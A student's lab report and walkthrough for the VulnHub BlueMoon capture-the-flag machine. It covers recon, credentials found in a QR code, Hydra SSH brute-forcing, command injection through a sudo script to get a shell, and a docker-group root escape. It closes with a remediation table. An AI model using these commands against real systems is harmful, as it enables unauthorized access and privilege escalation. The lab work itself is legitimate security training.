
# Vulnerability Analysis - Week 3: Vulnhub Bluemoon

This repository contains the documentation, walkthrough, and lab report for **Week 3 Lab: Vulnhub - Bluemoon**.

* **Machine Name:** BlueMoon-2021
* **Author:** Kirthik-[H4ck3r]
* **Difficulty:** Easy
* **Goal:** Get Root
* **Student Name:** Nurul Rabiatul Ifah Binti Mohd Azizi (L01-B01)

---

  # Vulnerability Assessment & Remediation Report: VulnHub BlueMoon

This repository contains the walkthrough, attack chain breakdown, and security remediation strategy for the **BlueMoon (2021)** VulnHub lab machine.

---

## 📌 Executive Summary

* **Target Machine:** BlueMoon-2021
* **Difficulty:** Easy / Intermediate
* **Goal:** User & Root Access (Flag Capture)
* **Core Vulnerabilities:**
  1. Plaintext credentials embedded in web assets (QR Code).
  2. Weak SSH authentication password policy.
  3. Insecure variable handling in `sudo` wrapper script.
  4. Unrestricted Docker daemon access via group membership.

---

## 🛠️ Environment Setup & Reconnaissance

### 1. Network Discovery
Identify the target host on the local subnet:

```bash
nmap -sn 172.20.10.0/24
```

* **Target IP Identified:** `172.20.10.6`

---

## 🔍 Attack Chain Walkthrough

### Phase 1: Web Enumeration & Credential Recovery
1. Perform directory fuzzing to discover hidden web paths:
   ```bash
   gobuster dir -u http://172.20.10.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```
   * Found endpoint: `http://172.20.10.6/hidden_text`

2. Locate image path `QR_C0d3.png` within the hidden directory and decode the QR code payload to reveal FTP credentials:
   * **Username:** `userftp`
   * **Password:** `ftpp@ssword`

---

### Phase 2: FTP Enumeration & Wordlist Retrieval
1. Connect via FTP and retrieve files:
   ```bash
   ftp 172.20.10.6
   ```
   ```ftp
   ftp> ls
   ftp> get information.txt
   ftp> get p_lists.txt
   ```
2. Analyze contents:
   * `information.txt`: Confirms target user `robin` uses a weak password contained within `p_lists.txt`.
   * `p_lists.txt`: Custom password wordlist.

---

### Phase 3: Initial Access (User: `robin`)
1. Perform password brute-forcing against SSH using Hydra:
   ```bash
   hydra -l robin -P p_lists.txt ssh://172.20.10.6
   ```
   * **Valid Credentials:** `robin` : `k4rv3ndh4nh4ck3r`

2. Authenticate via SSH and read the first flag:
   ```bash
   ssh robin@172.20.10.6
   cat user1.txt
   ```

---

### Phase 4: Lateral Movement (`robin` ➔ `jerry`)
1. Inspect allowed `sudo` commands for user `robin`:
   ```bash
   sudo -l
   ```
   * Result: `(jerry) NOPASSWD: /home/robin/project/feedback.sh`

2. Inspect the script `/home/robin/project/feedback.sh`:
   ```bash
   #!/bin/bash
   read -p "Enter Your Name : " name
   read -p "Enter Your FeedBack About This Target Machine: " feedback
   $feedback 2>/dev/null
   ```

3. Exploit the unquoted `$feedback` dynamic evaluation:
   ```bash
   sudo -u jerry /home/robin/project/feedback.sh
   ```
   * When prompted for feedback, enter `/bin/bash` to gain a shell as `jerry`.

4. Retrieve user 2 flag:
   ```bash
   cat /home/jerry/user2.txt
   ```

---

### Phase 5: Root Privilege Escalation
1. Check user `jerry`'s secondary groups:
   ```bash
   id
   ```
   * Group membership includes `docker` (gid 114).

2. Mount the host filesystem inside a temporary container to break out into host root context:
   ```bash
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```

3. Access the root flag:
   ```bash
   cat /root/root.txt
   ```

---

## 🛡️ Remediation & Security Hardening

| Vulnerability | Security Risk | Recommended Remediation |
| :--- | :--- | :--- |
| **Hardcoded Credentials** | Sensitive data exposed in public web directories. | Remove credentials from web assets; store secrets in dedicated key vaults. |
| **Weak SSH Passwords** | Susceptible to dictionary/brute-force attacks. | Enforce strong password policies or mandate SSH Key-based authentication. |
| **Unsanitized Script Exec** | Dynamic variable evaluation allows command injection. | Sanitize input variables; avoid running custom user scripts with elevated `sudo` privileges. |
| **Docker Group Access** | `docker` group membership grants root-equivalent access to local filesystem. | Restrict `docker` group membership; implement rootless Docker containers where possible. |

---

## 📄 License
This repository is published for educational and authorized testing documentation purposes only.
